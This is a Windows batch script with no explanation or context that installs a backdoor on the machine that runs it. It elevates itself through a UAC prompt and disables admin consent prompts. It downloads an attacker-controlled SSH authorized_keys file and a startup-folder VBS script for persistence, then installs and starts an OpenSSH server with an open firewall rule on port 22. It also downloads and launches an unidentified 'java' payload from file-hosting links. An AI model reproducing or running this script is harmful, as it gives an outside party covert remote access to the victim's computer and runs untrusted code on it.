>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

@echo off 
if '%errorlevel%' NEQ '0' (
@echo off 
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  
PowerShell Set-ExecutionPolicy RemoteSigned -Force
PowerShell Set-ExecutionPolicy -Force
PowerShell Set-ExecutionPolicy Bypass -Scope Process -Force
PowerShell Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value "0" 
PowerShell New-Item -Path C:\ -Name temp -ItemType Directory
PowerShell New-item -Path $env:USERPROFILE -Name .ssh -ItemType Directory -force
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://download1528.mediafire.com/2etq9gionddgmtZ3TUdpwLlvO1XuyDO3GBwj8hR2hztlRZ1EeAuzsYmv0rcDUyMN9FIYPiQxSvJqlcBXrMmH4YLZqTdAjeUE5MEV91D2c4Ia1YtsTjHuuQsOilOPKrfYsdBNhOOqsp98Jsve84k79jNN0IhMoCwgHovbp-2Fss3sSQ/3c82ht9v28rilaj/java.zip','C:\temp\java.zip')
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/authorized_keys ','C:\%HoMePath%\.ssh\authorized_keys')
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/iniciar.vbs ','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\iniciar.vbs')
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/OpenSSH-Win64.zip','C:\temp\OpenSSH-Win64.zip')
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://github.com/ghostman2709/files/raw/main/temp.zip','C:\temp\temp.zip')
PowerShell Expand-Archive -Path "C:\temp\temp.zip" -DestinationPath "C:\temp"
PowerShell Expand-Archive -Path "C:\temp\OpenSSH-Win64.Zip" -DestinationPath "C:\ProgramData\OpenSSH"
PowerShell Expand-Archive -Path "C:\temp\java.zip" -DestinationPath "C:\temp"
PowerShell . "C:\ProgramData\OpenSSH\OpenSSH-Win64\install-sshd.ps1"
PowerShell New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
PowerShell Set-Service sshd -StartupType Automatic
PowerShell Start-Service sshd
PowerShell Start-Process -FilePath "C:\temp\java\run"
exit
